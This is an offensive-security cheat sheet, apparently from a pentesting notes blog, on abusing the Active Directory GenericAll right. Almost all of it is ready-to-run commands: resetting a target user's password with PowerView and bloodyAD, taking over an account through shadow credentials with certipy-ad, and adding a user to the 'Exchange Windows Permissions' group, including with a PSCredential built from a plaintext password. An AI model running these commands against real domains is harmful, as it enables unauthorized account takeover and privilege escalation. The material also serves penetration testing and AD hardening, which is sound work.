---
title: "GenericAll"
date: 2024-7-12
tags: ["GenericAll", "active driectory", "ad", "Windows", "shadow credentials"]
---

---
### Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

### Abuse #1 : Change Target User Password 

#### From Windows

```powershell
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force 
```

```powershell
Set-DomainUserPassword -Identity <target_user> -AccountPassword $pass
```

#### From Linux

[bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
```

### Abuse #2 : Get shawdow credentials (From Linux)

```bash
sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -k -account <TARGET_USER> -target <DC>
```

### Abuse #3 : Add user to group

#### Authenticated

```powershell
# For example 'Exchange Windows Permissions'
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members USER
```

#### Runas

```powershell
$username = "domain\username"
```

```powershell
$password = "password"
```

```powershell
$secstr = New-Object -TypeName System.Security.SecureString
```

```powershell
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

```powershell
# Add user to group (e.g. Exchange Windows Permissions)
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members USER -Credential $Cred
```

<br>